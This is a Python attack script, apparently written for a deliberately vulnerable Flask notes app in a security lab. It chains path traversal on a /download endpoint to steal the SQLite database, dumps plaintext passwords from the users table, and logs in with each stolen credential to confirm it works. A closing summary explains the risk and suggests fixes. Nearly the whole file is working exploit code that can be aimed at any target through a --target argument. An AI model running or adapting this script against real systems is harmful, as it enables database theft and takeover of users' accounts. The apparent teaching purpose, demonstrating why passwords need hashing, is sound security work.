#!/usr/bin/env python3
"""
LFI -> Database Credential Dump
================================

this script chains LFI with plaintext password storage to steal every credential

the attack flow:
  1. register a throwaway account (any user can access /download)
  2. use path traversal to download the sqlite .db file from the server
     the vulnerable /download endpoint has no path validation so
     /download?file=../../../instance/notes.db serves the raw database
  3. open the stolen database locally and read the users table
     because passwords are stored as plaintext we can read them directly
  4. verify each stolen credential by logging in

this is the most devastating attack in the app because it requires
only ONE vulnerability (LFI) to compromise ALL accounts at once
even if the LFI is patched later, the stolen passwords still work
and users who reuse passwords across sites are compromised everywhere

if passwords were hashed (bcrypt/argon2), the attacker would get the database
but cracking each hash would take hours or days instead of zero seconds

usage:
    python3 scripts/credential_dump.py
    python3 scripts/credential_dump.py --target http://127.0.0.1:5000
"""

import argparse
import os
import sqlite3
import sys
import tempfile
import time

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"

# unique username so multiple runs dont clash
ATTACKER_USER = "dbdump_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "dump_probe_2026"

# we try different ../ depths because we dont know exactly how deep
# the static/files/ directory is relative to the database location
TRAVERSAL_DEPTHS = range(1, 12)

# common database file paths to try
# flask defaults to instance/notes.db but other frameworks use different names
DB_PATHS = [
    "instance/notes.db",       # flask default location
    "notes.db",                # project root
    "db.sqlite3",              # django convention
    "app.db",                  # common generic name
    "database.db",             # another common name
]


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CN = "\033[96m"; B = "\033[1m"; D = "\033[2m"; X = "\033[0m"

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")

def is_login_page(text):
    """detects if we got redirected to the login page instead of getting the file
    we check for multiple indicators because some error pages might match one alone"""
    indicators = ["<title>Login</title>", "name=\"username\"", "name=\"password\""]
    return sum(1 for i in indicators if i in text) >= 2


# ──────────────────────────────────────────────
# phase 1 -- register a throwaway account
# we need any valid session to access /download because of before_request
# ──────────────────────────────────────────────

def phase1_register(session, target):
    banner("PHASE 1 -- Register a Throwaway Account")
    info(f"Creating account: '{ATTACKER_USER}'")

    try:
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        # if registration redirected to login, the username might already exist
        if is_login_page(resp.text):
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Authentication failed")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        return True

    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}")
        return False


# ──────────────────────────────────────────────
# phase 2 -- find and download the database file via LFI
#
# the /download endpoint joins the filename directly with os.path.join
# so we can use ../ sequences to escape the static/files/ directory
# and reach the instance/notes.db sqlite file
#
# we try multiple paths and depths because we dont know the exact layout
# when we get a response that starts with "SQLite format 3" (the magic bytes)
# we know we found the database
# ──────────────────────────────────────────────

def phase2_download_db(session, target):
    banner("PHASE 2 -- Download Database via LFI")
    info("Searching for database files via path traversal...")
    print()

    for db_path in DB_PATHS:
        info(f"Trying: {db_path}")

        for depth in TRAVERSAL_DEPTHS:
            # build the traversal payload: ../../../instance/notes.db
            traversal = "../" * depth + db_path
            url = f"{target}/download?file={traversal}"

            try:
                resp = session.get(url, timeout=10)

                # check if we got actual content (not a login redirect or 404)
                if resp.status_code == 200 and not is_login_page(resp.text):
                    content = resp.content

                    # sqlite databases always start with this 16-byte magic string
                    # if we see it, we know we have a real database file
                    if content[:16].startswith(b"SQLite format 3"):
                        ok(f"SQLite database found!")
                        ok(f"Path: {'../' * depth}{db_path}")
                        ok(f"Size: {len(content)} bytes")

                        # save to a temp file so we can open it with sqlite3
                        tmp = tempfile.NamedTemporaryFile(
                            suffix=".db", delete=False, prefix="stolen_"
                        )
                        tmp.write(content)
                        tmp.close()
                        ok(f"Saved to: {tmp.name}")

                        return tmp.name

            except:
                pass  # connection errors, timeouts, etc -- just try the next depth

        fail(f"  {db_path} -- not found at any depth")

    return None


# ──────────────────────────────────────────────
# phase 3 -- open the stolen database and extract credentials
#
# we use python's built-in sqlite3 module to read the database locally
# no more network requests needed -- we have the entire database on disk
#
# the key vulnerability here is that passwords are stored as plaintext
# so reading the users table gives us every username:password pair instantly
# ──────────────────────────────────────────────

def phase3_dump_credentials(db_path):
    banner("PHASE 3 -- Extract Credentials from Database")
    info(f"Opening stolen database: {db_path}")
    print()

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    # first list all tables to understand the database structure
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
    tables = [row[0] for row in cursor.fetchall()]
    info(f"Tables found: {', '.join(tables)}")
    print()

    credentials = []

    if "users" in tables:
        ok("'users' table found -- dumping contents:")
        print()

        # get column names so we can build a pretty output table
        cursor.execute("PRAGMA table_info(users)")
        columns = [col[1] for col in cursor.fetchall()]
        info(f"Columns: {', '.join(columns)}")
        print()

        # fetch every row in the users table
        cursor.execute("SELECT * FROM users")
        rows = cursor.fetchall()

        # print a formatted table of all user records
        print(f"  {C.B}{'ID':<5}{'USERNAME':<20}{'PASSWORD':<25}{'ROLE':<10}{'CREATED'}{C.X}")
        print(f"  {'─' * 75}")

        for row in rows:
            # zip column names with values so we can access by name
            row_dict = dict(zip(columns, row))
            uid = row_dict.get('id', '?')
            username = row_dict.get('username', '?')
            password = row_dict.get('password', '?')
            role = row_dict.get('role', '?')
            created = str(row_dict.get('created_at', '?'))[:19]

            # check if the password looks like a hash or plaintext
            # hashed passwords start with algorithm identifiers like $2b$ (bcrypt)
            # or pbkdf2: (werkzeug) or scrypt: or $argon2
            is_plaintext = not password.startswith(('$2b$', '$argon2', 'pbkdf2:', 'scrypt:'))

            if is_plaintext:
                pwd_display = f"{C.R}{password}{C.X}"
                credentials.append((username, password, role))
            else:
                # if passwords are hashed, the damage is contained
                pwd_display = f"{C.G}[hashed]{C.X}"

            print(f"  {uid:<5}{C.Y}{username:<20}{C.X}{pwd_display:<35}{role:<10}{C.D}{created}{C.X}")

        print(f"\n  {C.B}Total: {len(rows)} users, {len(credentials)} with plaintext passwords{C.X}")

    else:
        warn("No 'users' table found")
        warn("Checking other tables for sensitive data...")

    # also peek at the notes table since it might contain secrets
    if "notes" in tables:
        print()
        info("Also dumping 'notes' table (may contain secrets):")

        cursor.execute("SELECT id, title, category FROM notes")
        notes = cursor.fetchall()
        for nid, title, category in notes:
            print(f"  {C.D}  Note #{nid}: [{category}] {title}{C.X}")

    conn.close()
    return credentials


# ──────────────────────────────────────────────
# phase 4 -- verify stolen credentials by actually logging in
# this proves the passwords are real and usable
# ──────────────────────────────────────────────

def phase4_verify(target, credentials):
    banner("PHASE 4 -- Verify Stolen Credentials")
    info(f"Testing {len(credentials)} stolen username:password pairs...\n")

    verified = []

    for username, password, role in credentials:
        # fresh session for each attempt to avoid cookie interference
        s = requests.Session()
        resp = s.post(f"{target}/login", data={
            "username": username,
            "password": password,
        }, allow_redirects=False, timeout=5)

        # 302 = login succeeded, 200 = login failed
        if resp.status_code == 302:
            ok(f"{C.G}VERIFIED{C.X}  {C.Y}{username}{C.X}:{C.R}{password}{C.X}  (role: {role})")
            verified.append((username, password, role))
            try:
                s.get(f"{target}/logout", timeout=3)
            except:
                pass
        else:
            fail(f"FAILED   {username}:{password}")

    print(f"\n  {len(verified)}/{len(credentials)} credentials verified and working")
    return verified


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary(db_path, credentials, verified):
    banner("ATTACK CHAIN SUMMARY")

    print(f"""
  {C.B}Complete chain -- database theft to full access:{C.X}

  +----------------------------------------------------------+
  |  1. REGISTER   ->  Create throwaway account               |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  2. LFI        ->  Download SQLite database via /download |
  |                    The .db file contains EVERYTHING:      |
  |                    user accounts, notes, all app data     |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  3. DUMP       ->  Open database, read users table        |
  |                    Passwords stored in PLAINTEXT          |
  |                    {C.R}{len(credentials)} accounts with readable passwords{C.X}       |
  +----------------------------+-----------------------------+
                               |
  +----------------------------v-----------------------------+
  |  4. VERIFY     ->  Log in with every stolen credential    |
  |                    {C.G}{len(verified)}/{len(credentials)} confirmed working{C.X}                    |
  +----------------------------------------------------------+

  {C.Y}Why plaintext passwords are catastrophic:{C.X}

    - One LFI vulnerability exposes EVERY user's password
    - Users often reuse passwords across sites
    - Attacker can access email, banking, social media
    - Even after patching the LFI, stolen passwords still work
    - Users must ALL change their passwords immediately

  {C.Y}If passwords were HASHED (bcrypt, argon2):{C.X}

    - LFI still downloads the database
    - But passwords would look like:
      $2b$12$LJ3m4ys5Lz0ecGn/sKFUgu6XJj... 
    - Cracking a single bcrypt hash takes hours/days
    - Strong passwords become practically uncrackable
    - The breach is still bad, but the damage is contained

  {C.B}How to fix:{C.X}

  {C.G}1. Hash passwords with bcrypt:{C.X}
     from werkzeug.security import generate_password_hash, check_password_hash
     user.password = generate_password_hash(password)

  {C.G}2. Fix the LFI:{C.X}
     Validate file paths with os.path.realpath() + startswith()

  {C.G}3. Move database outside web root:{C.X}
     Store the .db file in a directory the web server cannot serve

  {C.D}Stolen database saved at: {db_path}{C.X}
  {C.D}You can inspect it: sqlite3 {db_path} "SELECT * FROM users;"{C.X}
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="LFI -> Database Credential Dump")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{C.B}{C.R}
  ██████╗ ██████╗     ██████╗ ██╗   ██╗███╗   ███╗██████╗ 
  ██╔══██╗██╔══██╗    ██╔══██╗██║   ██║████╗ ████║██╔══██╗
  ██║  ██║██████╔╝    ██║  ██║██║   ██║██╔████╔██║██████╔╝
  ██║  ██║██╔══██╗    ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ 
  ██████╔╝██████╔╝    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     
  ╚═════╝ ╚═════╝     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     
{C.X}
  {C.D}LFI -> Download Database -> Dump Plaintext Credentials{C.X}
  {C.D}Target: {target}{C.X}
""")

    session = requests.Session()

    time.sleep(0.5)

    if not phase1_register(session, target):
        sys.exit(1)

    time.sleep(0.5)

    db_path = phase2_download_db(session, target)
    if not db_path:
        fail("Could not find database via LFI")
        fail("Is the /download endpoint in app.py?")
        sys.exit(1)

    time.sleep(0.5)

    credentials = phase3_dump_credentials(db_path)
    if not credentials:
        warn("No plaintext credentials found in database")
        warn("Passwords might be hashed (good security!)")
        os.unlink(db_path)
        sys.exit(0)

    time.sleep(0.5)

    verified = phase4_verify(target, credentials)
    print_summary(db_path, credentials, verified)


if __name__ == "__main__":
    main()
